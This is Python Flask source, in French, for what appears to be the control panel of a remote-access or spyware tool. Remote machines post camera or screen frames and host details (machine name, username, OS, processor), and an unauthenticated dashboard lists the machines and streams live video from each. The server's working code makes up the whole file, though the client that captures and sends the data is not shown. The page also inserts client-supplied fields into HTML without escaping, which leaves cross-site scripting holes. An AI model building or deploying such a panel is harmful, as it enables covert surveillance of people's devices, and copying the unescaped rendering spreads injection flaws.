from flask import Flask, Response, request
from datetime import datetime, timedelta
import threading
import time

app = Flask(__name__)

infos_data = {}
latest_frames = {}
locks = {}
last_seen = {}

@app.route('/')
def index():
    return '''
    <html>
    <head>
        <title>Machines connectées</title>
        <style>
            body {
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                margin: 20px;
                background-color: #f0f2f5;
                color: #333;
            }
            h1 {
                margin-bottom: 30px;
                display: flex;
                align-items: center;
                gap: 10px;
            }
            .grid {
                display: flex;
                flex-wrap: wrap;
                gap: 15px;
            }
            .card {
                display: block;
                width: 220px;
                padding: 15px;
                background-color: white;
                border-radius: 12px;
                box-shadow: 0 4px 8px rgba(0,0,0,0.1);
                text-decoration: none;
                color: inherit;
                transition: transform 0.2s ease, box-shadow 0.2s ease;
            }
            .card:hover {
                transform: translateY(-5px);
                box-shadow: 0 8px 16px rgba(0,0,0,0.15);
            }
            .card h3 {
                margin-top: 0;
                font-size: 1.2em;
                margin-bottom: 10px;
            }
            .card p {
                margin: 5px 0 0;
                font-size: 0.95em;
            }
            .refresh-btn {
                background: none;
                border: none;
                cursor: pointer;
                font-size: 1.3em;
                color: #007BFF;
                padding: 0;
                line-height: 1;
                display: flex;
                align-items: center;
                justify-content: center;
            }
            .arrow {
                display: inline-block;
                transition: transform 0.2s ease-out;
                transform-origin: center;
            }
            .refresh-btn:hover .arrow {
                transform: rotate(90deg);
            }
        </style>
    </head>
    <body>
        <h1>
            Machines connectées
            <button type="button" class="refresh-btn" id="reset-btn" title="Réinitialiser">
                <span class="arrow">&#x21bb;</span>
            </button>
        </h1>
        <div class="grid" id="machine-list">
            <!-- Les cartes seront insérées ici -->
        </div>

        <script>
        async function fetchMachines() {
            const res = await fetch('/machines');
            const data = await res.json();
            const container = document.getElementById("machine-list");
            container.innerHTML = ""; // Vider la liste

            if (data.machines.length === 0) {
                container.innerHTML = "<p>Aucune machine connectée pour le moment.</p>";
            } else {
                for (const m of data.machines) {
                    const status = m.connected ? "✅" : "❌";
                    const card = document.createElement("a");
                    card.className = "card";
                    card.href = "/camera/" + m.ip;
                    card.innerHTML = `
                        <h3><span id="status-${m.ip}">${status}</span> ${m.ip}</h3>
                        <p>${m.name}</p>
                    `;
                    container.appendChild(card);
                }
            }
        }

        async function resetMachines() {
            await fetch('/reset', { method: 'POST' });
            await fetchMachines();
        }

        document.getElementById("reset-btn").addEventListener("click", resetMachines);

        setInterval(fetchMachines, 3000); // Mise à jour toutes les 3 secondes
        fetchMachines(); // Appel initial
        </script>
    </body>
    </html>
    '''

@app.route('/camera/<ip>')
def camera(ip):
    info = infos_data.get(ip, {})
    now = time.time()
    last = last_seen.get(ip, 0)
    connected = (now - last) < 5
    status_text = "Connecté" if connected else "Déconnecté"
    status_color = "#28a745" if connected else "#dc3545"

    info_box = f"""
        <div class="info-box">
            <p><strong>Status :</strong> <span id="status" style="font-weight:bold;">Chargement...</span></p>
            <p><strong>Machine :</strong> {info.get("MachineName", "?")}</p>
            <p><strong>User :</strong> {info.get("Username", "?")}</p>
            <p><strong>OS :</strong> {info.get("OS", "?")}</p>
            <p><strong>Arch :</strong> {info.get("Arch", "?")}</p>
            <p><strong>Proc :</strong> {info.get("Proc", "?")}</p>
        </div>
    """

    return f'''
    <html>
    <head>
        <title>Flux de la machine {ip}</title>
        <style>
            body {{
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                margin: 0;
                background-color: #f0f2f5;
                color: #333;
                display: flex;
                flex-direction: row;
                height: 100vh;
                align-items: center;
                justify-content: center;
                gap: 30px;
                padding: 20px;
                box-sizing: border-box;
            }}
            .info-box {{
                width: 260px;
                background: white;
                border-radius: 12px;
                padding: 20px;
                box-shadow: 0 6px 15px rgba(0,0,0,0.1);
                font-size: 1rem;
                line-height: 1.5;
            }}
            img {{
                max-width: 75vw;
                max-height: 85vh;
                border-radius: 12px;
                box-shadow: 0 8px 20px rgba(0,0,0,0.15);
                border: 3px solid #333;
                object-fit: contain;
            }}
            a {{
                position: fixed;
                bottom: 20px;
                left: 20px;
                text-decoration: none;
                color: #007BFF;
                font-weight: 600;
                font-size: 1.1rem;
                background: white;
                padding: 8px 14px;
                border-radius: 8px;
                box-shadow: 0 3px 8px rgba(0,0,0,0.15);
                transition: background-color 0.3s ease;
            }}
            a:hover {{
                background-color: #e2e6ea;
            }}
            p {{
                margin: 8px 0;
            }}
        </style>
    </head>
    <body>
        {info_box}
        <img src="/video/{ip}" alt="Flux vidéo de la machine {ip}">
        <a href="/">← Retour</a>
        <script>
            function updateStatus() {{
                fetch('/status/{ip}')
                    .then(res => res.json())
                    .then(data => {{
                        const el = document.getElementById("status");
                        if (data.connected) {{
                            el.innerText = "Connecté";
                            el.style.color = "#28a745";
                        }} else {{
                            el.innerText = "Déconnecté";
                            el.style.color = "#dc3545";
                        }}
                    }});
            }}
            setInterval(updateStatus, 2000);
            updateStatus();
            </script>
    </body>
    </html>
    '''

@app.route('/video/<ip>')
def video(ip):
    def generate():
        while True:
            with locks.setdefault(ip, threading.Lock()):
                frame = latest_frames.get(ip, None)
            if frame:
                yield (b'--frame\r\n'
                       b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
            time.sleep(0.1)  # 10 FPS
    return Response(generate(), mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route('/upload', methods=['POST'])
def upload():
    ip = request.form.get('ip')
    file = request.files.get('image')

    if not ip or not file:
        return 'Missing IP or image', 400

    with locks.setdefault(ip, threading.Lock()):
        latest_frames[ip] = file.read()

    # Met à jour la dernière vue
    last_seen[ip] = time.time()

    return 'ok'

@app.route('/infos', methods=['POST'])
def infos():
    data = request.get_json()
    ip = data.get("IP")

    if not ip:
        return "Missing IP", 400

    infos_data[ip] = {
        "MachineName": data.get("MachineName"),
        "Username": data.get("Username"),
        "OS": data.get("OS"),
        "Arch": data.get("Arch"),
        "Proc": data.get("Proc")
    }

    return "Infos reçues"

@app.route('/status/<ip>')
def status(ip):
    now = time.time()
    last = last_seen.get(ip, 0)
    connected = (now - last) < 2
    return {'connected': connected}

@app.route('/reset', methods=['POST'])
def reset():
    now = time.time()
    to_remove = [ip for ip, t in last_seen.items() if now - t >= 5]

    for ip in to_remove:
        infos_data.pop(ip, None)
        last_seen.pop(ip, None)
        latest_frames.pop(ip, None)
        locks.pop(ip, None)

    return '', 204

@app.route('/machines')
def get_machines():
    now = time.time()
    machines = []

    for ip, info in infos_data.items():
        machines.append({
            'ip': ip,
            'name': info.get('MachineName', ''),
            'connected': (now - last_seen.get(ip, 0)) < 5
        })

    return {'machines': machines}

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, threaded=True)
